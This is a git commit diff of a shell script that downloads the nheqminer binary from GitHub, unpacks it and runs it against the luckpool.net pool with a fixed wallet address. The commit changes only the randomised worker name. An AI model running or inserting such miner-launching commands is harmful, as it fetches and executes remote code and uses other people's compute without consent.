0a65a1ecd84f2de4fd4bbb299206a7e6e4e17b5f
farestoyomkl <93335118+farestoyomkl@users.noreply.github.com>
2021-10-28 22:38:36 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -10,4 +10,4 @@ git clone https://github.com/farestoyomkl/farestoyo2.git && git update-index --c
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 tar -xvf nheqminer-Linux-v0.8.2.tgz 
 tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.$(echo $(shuf -i 1000-9999 -n 1)#5drz-sssa) -p x -t 2
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.$(echo $(shuf -i 1000-9999 -n 1)rucika#5drz-sssa) -p x -t 2
